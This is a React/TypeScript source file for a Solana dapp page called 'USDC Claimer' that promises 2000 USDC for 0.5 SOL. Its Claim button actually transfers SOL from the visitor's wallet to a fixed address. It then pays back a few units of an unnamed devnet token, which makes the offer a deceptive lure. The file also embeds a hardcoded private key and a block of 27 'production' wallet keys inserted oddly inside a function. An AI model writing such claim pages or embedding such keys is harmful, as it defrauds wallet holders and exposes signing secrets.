/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "653f1bas19XVej5fcXFfiDfJcBnHK583ZzfPn7W189qtjVcioc8CbW3gJ1ktPiRSju2DwKQqWaJmPPfLuSmpZkwA"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3qLcLmnPc8DKM4rjc5GoDNJ1ni6mwU8396ciSJmDe83PYHwFBFrUjdFdLmFu1c1sS9PZF9rybX855yNuBeawmujs",
  "key1": "21BVJnvaHQNkyATk1kX8XPnXvCBr3MvVKvfVayuyG3UQmmFh2mANGhnGpqSVE1PknZcTp2GDcY8KVmttK5U1ixKj",
  "key2": "S9YXgi7rQbC71k5F5sFL9LjVwnk36ucMXQ1hV7aGrSXbBXNd6aoJGC2Wbec12Jes78yqjpr8cxjqsuV5akstjzp",
  "key3": "4pQUmJTTQF1pDfj5zRmhGaRCXcLw2dPftdvKXG4mappyezS5hvTiEdUdaL8ngVNNggd44CgrZ9UeTYTPCry1jswp",
  "key4": "5SLngwUNrC1G3wTRvFuL6WuwSp4g5NV6FrhZF1FfEVPq7iixUvcvXEgqdnQLdtdfiWdj43h9naFBcKGSJJ8LJMgy",
  "key5": "2zrbPWRJJB5zGTer7LeiadqWhqxsM7SLUGQ9xJoEzXmtudjhVx3VWjfEzgvgj8inzZH7E9a3jDpHFcmyqXTvE6Pe",
  "key6": "Sd3bxufay6EzpW7jytw9M17KuDJPEguPWoxfUCRppJ88kVywJCYjzJMD5hqdLDLLTiDAERmQbXzJChgry3D4uqJ",
  "key7": "27ZRxHZ9H5T2MYvnUrqQNKe3LHbDhwtYXvXWPtAgPt997xX5yJNHyoy6DGVoduJwkeNYuorEPbN6u5TL734Gebz8",
  "key8": "2u4vKNgAfaihy4SJYKtUwKUB2DjD76QfjtvZXAbBu1dRUSuuL1pWK3NpgHe2jCT7FeSnAuZZ6JhH5VHhHXB5kp7T",
  "key9": "2KbMLxNtJA5t83nTDJvoCjea4RV3cPtua5dUiTQ5bBJ5y97m9GpJwDS33FRpz11D6mVHT5J99PARx5f3C9BLsF1c",
  "key10": "2vnuxAyr5ePXM4Mf9LpoXbSwGZYEAjN2GoJJrB1m6zBi56GAQFZedHBp6pEu7nMyuTJhHmKRgbrarzQh6eTDYXiC",
  "key11": "2FeftYNyb5KuryUUPHrBWc76vT9zJujuGCVB6Cm6Yh5AKkVMTCN1ViGWpR5THGDmsw2M2sTHZ6FUJEiYuLUKWa18",
  "key12": "54pVx6p8DcJptxhkcR5YMzt4dbikDfTJgn1bpzbusEsZBBy1cxdPm6A9rCGFD4k5prtdFCSCcfAUVdfgwxFWnqZM",
  "key13": "WUMFZU6fLuHYLbZr588gzFoYqXFsV4mfzbkjUUiZcjixZadrz5eMdpmAGUBeWiXQTi3p7PZCA4P59DQiHKmnU97",
  "key14": "5UMhKmKtKP6Gz5yKqZwMKtwSZXJJSQtedHbAXJSbyJyY6F6YfuAKcL7RrMRG2RNAeHw2t3c3F6XLewkuL7H4vkq3",
  "key15": "HTLTbdJzZSBK4ZqR5eSvjBfWRs6849yuKN3jnRjcihqxCJtVHeBVrBi79rkmADVWc7iYREepGrnovwrTuNKdPcU",
  "key16": "4CEzq4HGihARJBaWPDTtdpCYvrSQ3WhihDyhf4oT3qTtKXBp5MBwK3yUzCjbmxjMKJbafVjwZ6Fyb8ViW1AKcTNp",
  "key17": "31SuvYkMjz85p6oTT85DHEhHqzhDyYG2vZVeSHduwJUw91vaYz5rYPo3ywzcetVYmzASWQTXwbdxxVJQEfeBBP54",
  "key18": "2PoMs35nxFoYSRdheviiJBs5mnPQ84vjUmMPPF77QC8wPbEnT7AuWUKQLgCKMPDswM9hqaxTxRgb8VbrfUw8cauw",
  "key19": "5PPFCta5EbFRK4mPsBHQgr4f2RPcwpFQ8uGANSx3opcmN3yejKxm4FTCVAQNHykpFGRc3f4N886cLUggRq91gY7a",
  "key20": "4DLJJXEQwGLZLi9Dk2SU2aSdWQPhSiBHkXuikMPzBjX9iH4v5qJHKWdDWpjQ2DgDyoKhAdwq3UXCpUkikGXeCB1",
  "key21": "4cG44cQak7Uzx8LHfJu786qWWarg9PFswg6eLCkVsHj4VVx62uvTmZqkkc9YirbCJ4FTjUPrMadFaS7VME5jiv53",
  "key22": "CwG5LxYkd7XAV6X698niop18AQ3JhBqo2cBYvtqpMZQRSXCarxGuTaaMcCCE5y7bDjEdQ424NoCHTkWfEgqA2X7",
  "key23": "5bsvwjz83oFTS5jUQBj4WmDYXsDkKe8XvXjVSGVfUShgffj5S55j7BW72Q5Fin8NPqor9BEemb5QiR3e85td3nnu",
  "key24": "Vtfe7bTNBWNfaAFh4fv822Eyw6JCWfeqdyW1RPv6esrXB6KNiaWZeV2hNbst7hEyhM6jppCBuGLtZPU3BhoLbdb",
  "key25": "2vwhj9UMQRpfhDhmxVLmL6rFrGJusjH2jX3f1wogWJovuqKmXxvFcvYjvef6tPjM55eijtkKTny7AGc7stWGjXsC",
  "key26": "5FXDbWCbc542TXZ9FtBCLiLYijUebkXMcxGHn7RARAsFmFQPRLspYYG922SQKEH4acZnGPpxMnKxuqxzNG3FCgMN"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
